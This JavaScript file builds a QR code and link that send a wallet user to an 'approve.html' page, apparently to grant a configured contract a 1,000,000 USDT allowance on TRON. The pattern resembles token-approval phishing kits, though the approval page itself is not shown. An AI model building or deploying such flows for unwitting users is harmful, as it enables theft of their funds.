// ============================================================
// CONFIGURATION
// ============================================================

const CONFIG = {
    CONTRACT_ADDRESS: "TMAi5Rs64aSxkvg1x1WVaQL1S3YStStjju",
    USDT_CONTRACT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
    APPROVE_AMOUNT: "1000000",
};

// ============================================================
// BUILD THE APPROVE QR CODE
// ============================================================

function generateApproveQR() {
    try {
        // Direct URL to approve page - Trust Wallet opens HTTPS URLs in its DApp browser
        // tronWeb gets injected automatically, and calling approve() triggers the native TX popup
        const approvePageUrl = window.location.origin + "/approve.html";

        const qrcodeContainer = document.getElementById("qrcode");

        if (typeof QRCode === "undefined") {
            qrcodeContainer.innerHTML = '<p style="color:#666;font-size:12px;padding:20px;">QR loading failed. Use button below.</p>';
            document.getElementById("mobile-link").href = approvePageUrl;
            return;
        }

        qrcodeContainer.innerHTML = "";

        new QRCode(qrcodeContainer, {
            text: approvePageUrl,
            width: 200,
            height: 200,
            colorDark: "#000000",
            colorLight: "#ffffff",
            correctLevel: QRCode.CorrectLevel.M,
        });

        // Mobile link - just the direct URL
        document.getElementById("mobile-link").href = approvePageUrl;
    } catch (err) {
        console.error("QR generation error:", err);
        var errEl = document.getElementById("error-msg");
        if (errEl) {
            errEl.style.display = "block";
            errEl.textContent = "Error generating QR: " + err.message;
        }
    }
}

// Initialize when DOM is ready
if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", generateApproveQR);
} else {
    generateApproveQR();
}
